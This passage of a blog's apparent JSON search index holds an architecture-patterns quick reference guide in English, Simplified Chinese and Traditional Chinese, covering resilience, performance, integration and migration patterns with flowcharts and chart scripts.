Authentication across services Federated Identity Centralize authentication and authorization Pattern Categories Architecture patterns can be grouped by the problems they solve: 🛡️ Resilience Patterns Patterns that help systems handle failures gracefully: Circuit Breaker: Prevents cascading failures by temporarily blocking calls to failing services. Like an electrical circuit breaker, it “trips” when failures exceed a threshold, allowing the system to fail fast and recover gracefully. Retry: Automatically retries failed operations to handle transient failures. Uses strategies like exponential backoff to avoid overwhelming already-stressed services. Bulkhead: Isolates resources into separate pools to prevent one failing component from consuming all resources. Named after ship compartments that contain flooding. 💡 Combining Resilience PatternsThese patterns work best together: Retry handles transient failures, Circuit Breaker prevents overwhelming failing services, and Bulkhead contains the blast radius of failures. ⚡ Performance Patterns Patterns that optimize system performance and responsiveness: Asynchronous Request-Reply: Decouples long-running operations from immediate responses, preventing timeouts and improving user experience. Materialized View: Pre-computes and stores query results to avoid expensive computations at read time. Ideal for complex aggregations and reports. Claim Check: Reduces message payload size by storing large data externally and passing only a reference. Improves messaging system performance and reduces costs. Sharding: Distributes data across multiple databases to improve scalability and performance. Each shard handles a subset of the total data. 🔄 Integration Patterns Patterns that facilitate communication between systems: Anti-Corruption Layer: Provides a translation layer between systems with different semantics, protecting your clean architecture from legacy system quirks. Gateway Aggregation: Combines multiple backend service calls into a single request, reducing client complexity and network overhead. Publisher-Subscriber: Enables asynchronous event-driven communication where publishers don’t need to know about subscribers. Federated Identity: Delegates authentication to external identity providers, enabling single sign-on across multiple systems. 🎯 Operational Patterns Patterns that improve system operations and management: Rate Limiting: Controls the rate of requests sent to services to avoid throttling errors and optimize throughput. Health Endpoint Monitoring: Exposes health check endpoints for proactive monitoring and automated recovery. Sidecar: Deploys helper components alongside applications to handle cross-cutting concerns like logging, monitoring, and configuration. 🏗️ Migration Patterns Patterns that support system modernization: Strangler Fig: Gradually replaces legacy systems by incrementally migrating functionality to new implementations. Named after a fig tree that grows around and eventually replaces its host. Decision Flowchart: Choosing the Right Pattern Use this flowchart to navigate to the most appropriate pattern for your situation: graph TD Start[What's your challenge?] --> Q1{Serviceavailability?} Q1 -->|Failing repeatedly| CB[Circuit Breaker] Q1 -->|Temporary failures| Retry[Retry Pattern] Q1 -->|One affects others| Bulkhead[Bulkhead] Q1 -->|Performance| Q2{What type?} Q2 -->|Long operations| Async[Asynchronous Request-Reply] Q2 -->|Slow queries| MV[Materialized View] Q2 -->|Large messages| CC[Claim Check] Q2 -->|Database scale| Shard[Sharding] Q1 -->|Integration| Q3{What need?} Q3 -->|Legacy system| ACL[Anti-Corruption Layer] Q3 -->|Multiple calls| GA[Gateway Aggregation] Q3 -->|Event distribution| PubSub[Publisher-Subscriber] Q3 -->|Authentication| FI[Federated Identity] Q1 -->|Operations| Q4{What aspect?} Q4 -->|Throttling| RL[Rate Limiting] Q4 -->|Monitoring| HEM[Health Endpoint] Q4 -->|Cross-cutting| Sidecar[Sidecar] Q1 -->|Migration| SF[Strangler Fig] style CB fill:#ff6b6b style Retry fill:#ff6b6b style Bulkhead fill:#ff6b6b style Async fill:#51cf66 style MV fill:#51cf66 style CC fill:#51cf66 style Shard fill:#51cf66 style ACL fill:#4dabf7 style GA fill:#4dabf7 style PubSub fill:#4dabf7 style FI fill:#4dabf7 style RL fill:#ffd43b style HEM fill:#ffd43b style Sidecar fill:#ffd43b style SF fill:#a78bfa Pattern Comparison Matrix Compare patterns across key dimensions: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_839eb12e4')); var option = { \"title\": { \"text\": \"Pattern Complexity vs Impact\" }, \"tooltip\": { \"trigger\": \"item\", \"formatter\": \"{b}Complexity: {c0}Impact: {c1}\" }, \"xAxis\": { \"type\": \"value\", \"name\": \"Implementation Complexity\", \"min\": 0, \"max\": 10 }, \"yAxis\": { \"type\": \"value\", \"name\": \"System Impact\", \"min\": 0, \"max\": 10 }, \"series\": [{ \"type\": \"scatter\", \"symbolSize\": 20, \"data\": [ {\"name\": \"Retry\", \"value\": [2, 7]}, {\"name\": \"Circuit Breaker\", \"value\": [4, 8]}, {\"name\": \"Bulkhead\", \"value\": [5, 8]}, {\"name\": \"Rate Limiting\", \"value\": [6, 7]}, {\"name\": \"Anti-Corruption Layer\", \"value\": [7, 9]}, {\"name\": \"Async Request-Reply\", \"value\": [6, 8]}, {\"name\": \"Materialized View\", \"value\": [5, 7]}, {\"name\": \"Claim Check\", \"value\": [3, 6]}, {\"name\": \"Strangler Fig\", \"value\": [8, 9]}, {\"name\": \"Sidecar\", \"value\": [4, 6]}, {\"name\": \"Sharding\", \"value\": [9, 9]}, {\"name\": \"Gateway Aggregation\", \"value\": [5, 7]}, {\"name\": \"Pub-Sub\", \"value\": [6, 8]}, {\"name\": \"Health Endpoint\", \"value\": [2, 6]}, {\"name\": \"Federated Identity\", \"value\": [7, 8]} ], \"label\": { \"show\": true, \"position\": \"top\", \"formatter\": \"{b}\" } }] }; chart.setOption(option); } })(); Pattern Combinations Many real-world systems combine multiple patterns for comprehensive solutions: Resilient Microservices Stack Circuit Breaker + Retry + Bulkhead + Health Endpoint Circuit Breaker: Prevents cascading failures Retry: Handles transient failures Bulkhead: Isolates resources Health Endpoint: Enables monitoring High-Performance API Gateway Gateway Aggregation + Rate Limiting + Async Request-Reply Gateway Aggregation: Reduces client calls Rate Limiting: Prevents overwhelming backends Async Request-Reply: Handles long operations Legacy System Modernization Strangler Fig + Anti-Corruption Layer + Federated Identity Strangler Fig: Gradual migration strategy Anti-Corruption Layer: Protects new code from legacy Federated Identity: Unified authentication Pattern Selection Criteria Consider these factors when choosing patterns: System Requirements 📋 Functional Requirements Availability: How much downtime is acceptable? Performance: What are your latency requirements? Scalability: How much growth do you expect? Consistency: What consistency guarantees do you need? Technical Constraints 🔧 Technical Factors Existing infrastructure: What systems are already in place? Team expertise: What patterns does your team know? Technology stack: What frameworks and libraries are available? Budget: What resources can you allocate? Operational Considerations ⚙️ Operations Monitoring: Can you observe the pattern's behavior? Maintenance: How complex is ongoing maintenance? Testing: Can you effectively test the implementation? Documentation: Is the pattern well-documented? Common Anti-Patterns Avoid these common mistakes when applying patterns: ⚠️ Pattern MisuseOver-engineering: Don't apply complex patterns to simple problems. Start simple and add patterns as needed. Pattern stacking: Avoid combining too many patterns without clear justification. Each pattern adds complexity. Ignoring trade-offs: Every pattern has costs. Consider performance overhead, operational complexity, and maintenance burden. Cargo cult implementation: Don't copy patterns without understanding why they work. Adapt patterns to your specific context. Getting Started Follow this approach when implementing patterns: 1. Identify the Problem Clearly define the challenge you’re trying to solve: What symptoms are you experiencing? What are the root causes? What are your success criteria? 2. Research Patterns Use this guide to identify candidate patterns: Review the quick reference table Follow the decision flowchart Read detailed pattern articles 3. Evaluate Options Compare patterns against your requirements: Implementation complexity Operational overhead Team expertise Budget constraints 4. Start Small Begin with a pilot implementation: Choose a non-critical component Implement the pattern Monitor and measure results Iterate based on learnings 5. Scale Gradually Expand successful implementations: Document lessons learned Train team members Apply to additional components Refine based on experience Pattern Maturity Model Assess your organization’s pattern adoption maturity: graph LR L1[Level 1:Ad-hoc] --> L2[Level 2:Aware] L2 --> L3[Level 3:Defined] L3 --> L4[Level 4:Managed] L4 --> L5[Level 5:Optimizing] style L1 fill:#ff6b6b style L2 fill:#ffd43b style L3 fill:#4dabf7 style L4 fill:#51cf66 style L5 fill:#a78bfa Level 1 - Ad-hoc: No consistent pattern usage, reactive problem-solving Level 2 - Aware: Team knows patterns exist, occasional usage Level 3 - Defined: Documented pattern guidelines, consistent application Level 4 - Managed: Metrics-driven pattern selection, regular reviews Level 5 - Optimizing: Continuous improvement, pattern innovation Complete Pattern Index Here’s the complete list of patterns covered in this series: Rate Limiting Pattern (January) - Control request rates to throttled services Anti-Corruption Layer Pattern (February) - Protect architecture from legacy systems Retry Pattern (March) - Handle transient failures gracefully Claim Check Pattern (April) - Reduce message payload sizes Materialized View Pattern (May) - Pre-compute complex queries Strangler Fig Pattern (June) - Gradually migrate legacy systems Sidecar Pattern (July) - Add functionality via helper components Sharding Pattern (August) - Distribute data for scalability Gateway Aggregation Pattern (September) - Combine multiple API calls Publisher-Subscriber Pattern (October) - Event-driven communication Health Endpoint Monitoring Pattern (November) - Proactive health checks Federated Identity Pattern (December) - Centralized authentication Circuit Breaker Pattern (January) - Prevent cascading failures Bulkhead Pattern (March) - Isolate resources to contain failures Asynchronous Request-Reply Pattern (April) - Handle long-running operations Additional Resources Books “Cloud Design Patterns” by Microsoft - Comprehensive pattern catalog “Release It!” by Michael Nygard - Production-ready software patterns “Building Microservices” by Sam Newman - Microservices architecture patterns “Domain-Driven Design” by Eric Evans - Strategic design patterns Online Resources Microsoft Azure Architecture Patterns AWS Architecture Center Martin Fowler’s Architecture Patterns Practice 💡 Learning by DoingThe best way to learn patterns is through hands-on practice: Build sample applications implementing each pattern Contribute to open-source projects using these patterns Conduct architecture reviews with your team Share knowledge through blog posts and presentations Conclusion Architecture patterns are powerful tools for solving common distributed systems challenges. This quick reference guide helps you: Quickly identify the right pattern for your problem Compare patterns across multiple dimensions Understand relationships between patterns Avoid common pitfalls in pattern application Plan your learning journey through the pattern catalog Remember: patterns are guidelines, not rigid rules. Adapt them to your specific context, measure their impact, and iterate based on results. Start with simple patterns like Retry and Health Endpoint Monitoring, then gradually adopt more complex patterns as your system evolves. commentBox('5765834504929280-proj')","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Reference Guide","slug":"Reference-Guide","permalink":"https://neo01.com/tags/Reference-Guide/"}]},{"title":"架构模式快速参考指南","slug":"2020/05/Architecture-Patterns-Quick-Reference-zh-CN","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/05/Architecture-Patterns-Quick-Reference/","permalink":"https://neo01.com/zh-CN/2020/05/Architecture-Patterns-Quick-Reference/","excerpt":"云端架构模式的完整快速参考指南。通过决策树、比较表格和实用选择标准，找到适合您挑战的正确模式。","text":"构建具有韧性、可扩展的分布式系统需要针对特定挑战选择正确的架构模式。本指南提供快速参考，帮助您根据问题领域选择最合适的模式，并附上每个模式的详细说明链接。 模式选择快速参考 使用此表格快速识别哪个模式能解决您的特定挑战： 您的挑战 建议模式 使用时机 服务调用超时 异步请求-回复 操作时间超过 HTTP 超时限制 服务持续失败 断路器 防止不可用的服务造成连锁故障 暂时性网络故障 重试 处理快速恢复的暂时性故障 一个服务影响其他服务 舱壁 隔离资源以控制故障范围 API 限流错误 速率限制 控制对限流服务的请求速率 遗留系统集成 防腐层 保护干净架构免受遗留系统影响 查询性能缓慢 物化视图 预先计算复杂查询以加快读取速度 大型消息负载 提领检查 通过外部存储数据来减少消息大小 迁移遗留系统 绞杀者无花果 逐步用现代系统替换遗留系统 跨领域关注点 边车 在不修改应用程序的情况下新增功能 数据库可扩展性 分片 将数据分散到多个数据库 多个 API 调用 网关聚合 将多个后端调用合并为一个 事件分发 发布-订阅 解耦事件生产者与消费者 服务健康监控 健康端点监控 主动检测服务故障 跨服务身份验证 联合身份 集中化身份验证和授权 模式分类 架构模式可以根据它们解决的问题进行分组： 🛡️ 韧性模式 帮助系统优雅处理故障的模式： 断路器：通过暂时阻止对失败服务的调用来防止连锁故障。就像电路断路器一样，当故障超过阈值时会&quot;跳闸&quot;，让系统快速失败并优雅恢复。 重试：自动重试失败的操作以处理暂时性故障。使用指数退避等策略来避免压垮已经承受压力的服务。 舱壁：将资源隔离到独立的池中，防止一个失败的组件消耗所有资源。以船舱命名，用于控制进水。 💡 组合韧性模式这些模式最好一起使用：重试处理暂时性故障，断路器防止压垮失败的服务，舱壁控制故障的爆炸半径。 ⚡ 性能模式 优化系统性能和响应性的模式： 异步请求-回复：将长时间运行的操作与即时响应解耦，防止超时并改善用户体验。 物化视图：预先计算并存储查询结果，避免在读取时进行昂贵的计算。适合复杂的聚合和报表。 提领检查：通过将大型数据存储在外部并仅传递引用来减少消息负载大小。改善消息系统性能并降低成本。 分片：将数据分散到多个数据库以提高可扩展性和性能。每个分片处理总数据的一个子集。 🔄 集成模式 促进系统间通信的模式： 防腐层：在具有不同语义的系统之间提供转换层，保护您的干净架构免受遗留系统怪癖的影响。 网关聚合：将多个后端服务调用合并为单一请求，减少客户端复杂性和网络开销。 发布-订阅：启用异步事件驱动通信，发布者不需要知道订阅者。 联合身份：将身份验证委派给外部身份提供者，实现跨多个系统的单点登录。 🎯 运营模式 改善系统运营和管理的模式： 速率限制：控制发送到服务的请求速率，避免限流错误并优化吞吐量。 健康端点监控：公开健康检查端点以进行主动监控和自动恢复。 边车：在应用程序旁部署辅助组件，处理日志记录、监控和配置等跨领域关注点。 🏗️ 迁移模式 支持系统现代化的模式： 绞杀者无花果：通过逐步将功能迁移到新实现来逐步替换遗留系统。以缠绕并最终替换宿主的无花果树命名。 决策流程图：选择正确的模式 使用此流程图导航到最适合您情况的模式： graph TD Start[您的挑战是什么？] --> Q1{服务可用性？} Q1 -->|重复失败| CB[断路器] Q1 -->|暂时性故障| Retry[重试模式] Q1 -->|一个影响其他| Bulkhead[舱壁] Q1 -->|性能| Q2{什么类型？} Q2 -->|长时间操作| Async[异步请求-回复] Q2 -->|查询缓慢| MV[物化视图] Q2 -->|大型消息| CC[提领检查] Q2 -->|数据库规模| Shard[分片] Q1 -->|集成| Q3{什么需求？} Q3 -->|遗留系统| ACL[防腐层] Q3 -->|多个调用| GA[网关聚合] Q3 -->|事件分发| PubSub[发布-订阅] Q3 -->|身份验证| FI[联合身份] Q1 -->|运营| Q4{什么方面？} Q4 -->|限流| RL[速率限制] Q4 -->|监控| HEM[健康端点] Q4 -->|跨领域| Sidecar[边车] Q1 -->|迁移| SF[绞杀者无花果] style CB fill:#ff6b6b style Retry fill:#ff6b6b style Bulkhead fill:#ff6b6b style Async fill:#51cf66 style MV fill:#51cf66 style CC fill:#51cf66 style Shard fill:#51cf66 style ACL fill:#4dabf7 style GA fill:#4dabf7 style PubSub fill:#4dabf7 style FI fill:#4dabf7 style RL fill:#ffd43b style HEM fill:#ffd43b style Sidecar fill:#ffd43b style SF fill:#a78bfa 模式比较矩阵 跨关键维度比较模式： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_253b027b1')); var option = { \"title\": { \"text\": \"模式复杂度 vs 影响\" }, \"tooltip\": { \"trigger\": \"item\", \"formatter\": \"{b}复杂度: {c0}影响: {c1}\" }, \"xAxis\": { \"type\": \"value\", \"name\": \"实现复杂度\", \"min\": 0, \"max\": 10 }, \"yAxis\": { \"type\": \"value\", \"name\": \"系统影响\", \"min\": 0, \"max\": 10 }, \"series\": [{ \"type\": \"scatter\", \"symbolSize\": 20, \"data\": [ {\"name\": \"重试\", \"value\": [2, 7]}, {\"name\": \"断路器\", \"value\": [4, 8]}, {\"name\": \"舱壁\", \"value\": [5, 8]}, {\"name\": \"速率限制\", \"value\": [6, 7]}, {\"name\": \"防腐层\", \"value\": [7, 9]}, {\"name\": \"异步请求-回复\", \"value\": [6, 8]}, {\"name\": \"物化视图\", \"value\": [5, 7]}, {\"name\": \"提领检查\", \"value\": [3, 6]}, {\"name\": \"绞杀者无花果\", \"value\": [8, 9]}, {\"name\": \"边车\", \"value\": [4, 6]}, {\"name\": \"分片\", \"value\": [9, 9]}, {\"name\": \"网关聚合\", \"value\": [5, 7]}, {\"name\": \"发布-订阅\", \"value\": [6, 8]}, {\"name\": \"健康端点\", \"value\": [2, 6]}, {\"name\": \"联合身份\", \"value\": [7, 8]} ], \"label\": { \"show\": true, \"position\": \"top\", \"formatter\": \"{b}\" } }] }; chart.setOption(option); } })(); 模式组合 许多实际系统结合多个模式以提供全面的解决方案： 韧性微服务堆栈 断路器 + 重试 + 舱壁 + 健康端点 断路器：防止连锁故障 重试：处理暂时性故障 舱壁：隔离资源 健康端点：启用监控 高性能 API 网关 网关聚合 + 速率限制 + 异步请求-回复 网关聚合：减少客户端调用 速率限制：防止压垮后端 异步请求-回复：处理长时间操作 遗留系统现代化 绞杀者无花果 + 防腐层 + 联合身份 绞杀者无花果：渐进式迁移策略 防腐层：保护新代码免受遗留系统影响 联合身份：统一身份验证 模式选择标准 选择模式时考虑这些因素： 系统需求 📋 功能需求 可用性：可接受多少停机时间？ 性能：您的延迟需求是什么？ 可扩展性：您预期多少增长？ 一致性：您需要什么一致性保证？ 技术限制 🔧 技术因素 现有基础设施：已经有哪些系统？ 团队专业知识：您的团队了解哪些模式？ 技术栈：有哪些框架和库可用？ 预算：您可以分配哪些资源？ 运营考量 ⚙️ 运营 监控：您能观察模式的行为吗？ 维护：持续维护有多复杂？ 测试：您能有效测试实现吗？ 文档：模式是否有良好的文档？ 常见反模式 应用模式时避免这些常见错误： ⚠️ 模式误用过度工程：不要将复杂的模式应用于简单的问题。从简单开始，根据需要添加模式。 模式堆叠：避免在没有明确理由的情况下组合太多模式。每个模式都会增加复杂性。 忽略权衡：每个模式都有成本。考虑性能开销、运营复杂性和维护负担。 货物崇拜实现：不要在不理解模式为何有效的情况下复制模式。根据您的特定情境调整模式。 入门指南 实现模式时遵循此方法： 1. 识别问题 清楚定义您试图解决的挑战： 您遇到什么症状？ 根本原因是什么？ 您的成功标准是什么？ 2. 研究模式 使用本指南识别候选模式： 查看快速参考表 遵循决策流程图 阅读详细的模式文章 3. 评估选项 根据您的需求比较模式： 实现复杂度 运营开销 团队专业知识 预算限制 4. 从小处开始 从试点实现开始： 选择非关键组件 实现模式 监控和测量结果 根据学习进行迭代 5. 逐步扩展 扩展成功的实现： 记录经验教训 培训团队成员 应用于其他组件 根据经验改进 模式成熟度模型 评估您组织的模式采用成熟度： graph LR L1[等级 1:临时] --> L2[等级 2:意识] L2 --> L3[等级 3:定义] L3 --> L4[等级 4:管理] L4 --> L5[等级 5:优化] style L1 fill:#ff6b6b style L2 fill:#ffd43b style L3 fill:#4dabf7 style L4 fill:#51cf66 style L5 fill:#a78bfa 等级 1 - 临时：没有一致的模式使用，被动解决问题 等级 2 - 意识：团队知道模式存在，偶尔使用 等级 3 - 定义：有文档化的模式指南，一致应用 等级 4 - 管理：指标驱动的模式选择，定期审查 等级 5 - 优化：持续改进，模式创新 完整模式索引 以下是本系列涵盖的完整模式列表： 速率限制模式（一月）- 控制对限流服务的请求速率 防腐层模式（二月）- 保护架构免受遗留系统影响 重试模式（三月）- 优雅处理暂时性故障 提领检查模式（四月）- 减少消息负载大小 物化视图模式（五月）- 预先计算复杂查询 绞杀者无花果模式（六月）- 逐步迁移遗留系统 边车模式（七月）- 通过辅助组件新增功能 分片模式（八月）- 分散数据以提高可扩展性 网关聚合模式（九月）- 合并多个 API 调用 发布-订阅模式（十月）- 事件驱动通信 健康端点监控模式（十一月）- 主动健康检查 联合身份模式（十二月）- 集中化身份验证 断路器模式（一月）- 防止连锁故障 舱壁模式（三月）- 隔离资源以控制故障 异步请求-回复模式（四月）- 处理长时间运行的操作 其他资源 书籍 “Cloud Design Patterns” by Microsoft - 全面的模式目录 “Release It!” by Michael Nygard - 生产就绪软件模式 “Building Microservices” by Sam Newman - 微服务架构模式 “Domain-Driven Design” by Eric Evans - 战略设计模式 在线资源 Microsoft Azure 架构模式 AWS 架构中心 Martin Fowler 的架构模式 实践 💡 从实践中学习学习模式的最佳方式是通过实践练习： 构建实现每个模式的示例应用程序 为使用这些模式的开源项目做出贡献 与您的团队进行架构审查 通过博客文章和演示分享知识 结论 架构模式是解决常见分布式系统挑战的强大工具。本快速参考指南帮助您： 快速识别适合您问题的正确模式 比较模式跨多个维度 理解关系模式之间的关系 避免常见陷阱在模式应用中 规划您的学习通过模式目录的旅程 记住：模式是指南，不是僵化的规则。根据您的特定情境调整它们，测量它们的影响，并根据结果进行迭代。从简单的模式如重试和健康端点监控开始，然后随着系统的发展逐步采用更复杂的模式。 commentBox('5765834504929280-proj')","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Reference Guide","slug":"Reference-Guide","permalink":"https://neo01.com/tags/Reference-Guide/"}],"lang":"zh-CN"},{"title":"架構模式快速參考指南","slug":"2020/05/Architecture-Patterns-Quick-Reference-zh-TW","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/05/Architecture-Patterns-Quick-Reference/","permalink":"https://neo01.com/zh-TW/2020/05/Architecture-Patterns-Quick-Reference/","excerpt":"雲端架構模式的完整快速參考指南。透過決策樹、比較表格和實用選擇標準，找到適合您挑戰的正確模式。","text":"建構具有韌性、可擴展的分散式系統需要針對特定挑戰選擇正確的架構模式。本指南提供快速參考，幫助您根據問題領域選擇最合適的模式，並附上每個模式的詳細說明連結。 模式選擇快速參考 使用此表格快速識別哪個模式能解決您的特定挑戰： 您的挑戰 建議模式 使用時機 服務呼叫逾時 非同步請求-回覆 操作時間超過 HTTP 逾時限制 服務持續失敗 斷路器 防止無法使用的服務造成連鎖故障 暫時性網路故障 重試 處理快速恢復的暫時性故障 一個服務影響其他服務 艙壁 隔離資源以控制故障範圍 API 節流錯誤 速率限制 控制對節流服務的請求速率 舊系統整合 防腐層 保護乾淨架構免受舊系統影響 查詢效能緩慢 具體化視圖 預先計算複雜查詢以加快讀取速度 大型訊息負載 提領檢查 透過外部儲存資料來減少訊息大小 遷移舊系統 絞殺者無花果 逐步用現代系統取代舊系統 跨領域關注點 側車 在不修改應用程式的情況下新增功能 資料庫可擴展性 分片 將資料分散到多個資料庫 多個 API 呼叫 閘道聚合 將多個後端呼叫合併為一個 事件分發 發布-訂閱 解耦事件生產者與消費者 服務健康監控 健康端點監控 主動偵測服務故障 跨服務身份驗證 聯合身份 集中化身份驗證和授權 模式分類 架構模式可以根據它們解決的問題進行分組： 🛡️ 韌性模式 幫助系統優雅處理故障的模式： 斷路器：透過暫時阻止對失敗服務的呼叫來防止連鎖故障。就像電路斷路器一樣，當故障超過閾值時會「跳閘」，讓系統快速失敗並優雅恢復。 重試：自動重試失敗的操作以處理暫時性故障。使用指數退避等策略來避免壓垮已經承受壓力的服務。 艙壁：將資源隔離到獨立的池中，防止一個失敗的元件消耗所有資源。以船艙命名，用於控制進水。 💡 組合韌性模式這些模式最好一起使用：重試處理暫時性故障，斷路器防止壓垮失敗的服務，艙壁控制故障的爆炸半徑。 ⚡ 效能模式 優化系統效能和回應性的模式： 非同步請求-回覆：將長時間執行的操作與即時回應解耦，防止逾時並改善使用者體驗。 具體化視圖：預先計算並儲存查詢結果，避免在讀取時進行昂貴的計算。適合複雜的聚合和報表。 提領檢查：透過將大型資料儲存在外部並僅傳遞參考來減少訊息負載大小。改善訊息系統效能並降低成本。 分片：將資料分散到多個資料庫以提高可擴展性和效能。每個分片處理總資料的一個子集。 🔄 整合模式 促進系統間通訊的模式： 防腐層：在具有不同語義的系統之間提供轉換層，保護您的乾淨架構免受舊系統怪癖的影響。 閘道聚合：將多個後端服務呼叫合併為單一請求，減少客戶端複雜性和網路開銷。 發布-訂閱：啟用非同步事件驅動通訊，發布者不需要知道訂閱者。 聯合身份：將身份驗證委派給外部身份提供者，實現跨多個系統的單一登入。 🎯 營運模式 改善系統營運和管理的模式： 速率限制：控制發送到服務的請求速率，避免節流錯誤並優化吞吐量。 健康端點監控：公開健康檢查端點以進行主動監控和自動恢復。 側車：在應用程式旁部署輔助元件，處理日誌記錄、監控和配置等跨領域關注點。 🏗️ 遷移模式 支援系統現代化的模式： 絞殺者無花果：透過逐步將功能遷移到新實作來逐步取代舊系統。以纏繞並最終取代宿主的無花果樹命名。 決策流程圖：選擇正確的模式 使用此流程圖導航到最適合您情況的模式： graph TD Start[您的挑戰是什麼？] --> Q1{服務可用性？} Q1 -->|重複失敗| CB[斷路器] Q1 -->|暫時性故障| Retry[重試模式] Q1 -->|一個影響其他| Bulkhead[艙壁] Q1 -->|效能| Q2{什麼類型？} Q2 -->|長時間操作| Async[非同步請求-回覆] Q2 -->|查詢緩慢| MV[具體化視圖] Q2 -->|大型訊息| CC[提領檢查] Q2 -->|資料庫規模| Shard[分片] Q1 -->|整合| Q3{什麼需求？} Q3 -->|舊系統| ACL[防腐層] Q3 -->|多個呼叫| GA[閘道聚合] Q3 -->|事件分發| PubSub[發布-訂閱] Q3 -->|身份驗證| FI[聯合身份] Q1 -->|營運| Q4{什麼方面？} Q4 -->|節流| RL[速率限制] Q4 -->|監控| HEM[健康端點] Q4 -->|跨領域| Sidecar[側車] Q1 -->|遷移| SF[絞殺者無花果] style CB fill:#ff6b6b style Retry fill:#ff6b6b style Bulkhead fill:#ff6b6b style Async fill:#51cf66 style MV fill:#51cf66 style CC fill:#51cf66 style Shard fill:#51cf66 style ACL fill:#4dabf7 style GA fill:#4dabf7 style PubSub fill:#4dabf7 style FI fill:#4dabf7 style RL fill:#ffd43b style HEM fill:#ffd43b style Sidecar fill:#ffd43b style SF fill:#a78bfa 模式比較矩陣 跨關鍵維度比較模式： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_fa9016636')); var option = { \"title\": { \"text\": \"模式複雜度 vs 影響\" }, \"tooltip\": { \"trigger\": \"item\", \"formatter\": \"{b}複雜度: {c0}影響: {c1}\" }, \"xAxis\": { \"type\": \"value\", \"name\": \"實作複雜度\", \"min\": 0, \"max\": 10 }, \"yAxis\": { \"type\": \"value\", \"name\": \"系統影響\", \"min\": 0, \"max\": 10 }, \"series\": [{ \"type\": \"scatter\", \"symbolSize\": 20, \"data\": [ {\"name\": \"重試\", \"value\": [2, 7]}, {\"name\": \"斷路器\", \"value\": [4, 8]}, {\"name\": \"艙壁\", \"value\": [5, 8]}, {\"name\": \"速率限制\", \"value\": [6, 7]}, {\"name\": \"防腐層\", \"value\": [7, 9]}, {\"name\": \"非同步請求-回覆\", \"value\": [6, 8]}, {\"name\": \"具體化視圖\", \"value\": [5, 7]}, {\"name\": \"提領檢查\", \"value\": [3, 6]}, {\"name\": \"絞殺者無花果\", \"value\": [8, 9]}, {\"name\": \"側車\", \"value\": [4, 6]}, {\"name\": \"分片\", \"value\": [9, 9]}, {\"name\": \"閘道聚合\", \"value\": [5, 7]}, {\"name\": \"發布-訂閱\", \"value\": [6, 8]}, {\"name\": \"健康端點\", \"value\": [2, 6]}, {\"name\": \"聯合身份\", \"value\": [7, 8]} ], \"label\": { \"show\": true, \"position\": \"top\", \"formatter\": \"{b}\" } }] }; chart.setOption(option); } })(); 模式組合 許多實際系統結合多個模式以提供全面的解決方案： 韌性微服務堆疊 斷路器 + 重試 + 艙壁 + 健康端點 斷路器：防止連鎖故障 重試：處理暫時性故障 艙壁：隔離資源 健康端點：啟用監控 高效能 API 閘道 閘道聚合 + 速率限制 + 非同步請求-回覆 閘道聚合：減少客戶端呼叫 速率限制：防止壓垮後端 非同步請求-回覆：處理長時間操作 舊系統現代化 絞殺者無花果 + 防腐層 + 聯合身份 絞殺者無花果：漸進式遷移策略 防腐層：保護新程式碼免受舊系統影響 聯合身份：統一身份驗證 模式選擇標準 選擇模式時考慮這些因素： 系統需求 📋 功能需求 可用性：可接受多少停機時間？ 效能：您的延遲需求是什麼？ 可擴展性：您預期多少成長？ 一致性：您需要什麼一致性保證？ 技術限制 🔧 技術因素 現有基礎設施：已經有哪些系統？ 團隊專業知識：您的團隊了解哪些模式？ 技術堆疊：有哪些框架和函式庫可用？ 預算：您可以分配哪些資源？ 營運考量 ⚙️ 營運 監控：您能觀察模式的行為嗎？ 維護：持續維護有多複雜？ 測試：您能有效測試實作嗎？ 文件：模式是否有良好的文件？ 常見反模式 應用模式時避免這些常見錯誤： ⚠️ 模式誤用過度工程：不要將複雜的模式應用於簡單的問題。從簡單開始，根據需要添加模式。 模式堆疊：避免在沒有明確理由的情況下組合太多模式。每個模式都會增加複雜性。 忽略權衡：每個模式都有成本。考慮效能開銷、營運複雜性和維護負擔。 貨物崇拜實作：不要在不理解模式為何有效的情況下複製模式。根據您的特定情境調整模式。 入門指南 實作模式時遵循此方法： 1. 識別問題 清楚定義您試圖解決的挑戰： 您遇到什麼症狀？ 根本原因是什麼？ 您的成功標準是什麼？ 2. 研究模式 使用本指南識別候選模式： 查看快速參考表 遵循決策流程圖 閱讀詳細的模式文章 3. 評估選項 根據您的需求比較模式： 實作複雜度 營運開銷 團隊專業知識 預算限制 4. 從小處開始 從試點實作開始： 選擇非關鍵元件 實作模式 監控和測量結果 根據學習進行迭代 5. 逐步擴展 擴展成功的實作： 記錄經驗教訓 培訓團隊成員 應用於其他元件 根據經驗改進 模式成熟度模型 評估您組織的模式採用成熟度： graph LR L1[等級 1:臨時] --> L2[等級 2:意識] L2 --> L3[等級 3:定義] L3 --> L4[等級 4:管理] L4 --> L5[等級 5:優化] style L1 fill:#ff6b6b style L2 fill:#ffd43b style L3 fill:#4dabf7 style L4 fill:#51cf66 style L5 fill:#a78bfa 等級 1 - 臨時：沒有一致的模式使用，被動解決問題 等級 2 - 意識：團隊知道模式存在，偶爾使用 等級 3 - 定義：有文件化的模式指南，一致應用 等級 4 - 管理：指標驅動的模式選擇，定期審查 等級 5 - 優化：持續改進，模式創新 完整模式索引 以下是本系列涵蓋的完整模式列表： 速率限制模式（一月）- 控制對節流服務的請求速率 防腐層模式（二月）- 保護架構免受舊系統影響 重試模式（三月）- 優雅處理暫時性故障 提領檢查模式（四月）- 減少訊息負載大小 具體化視圖模式（五月）- 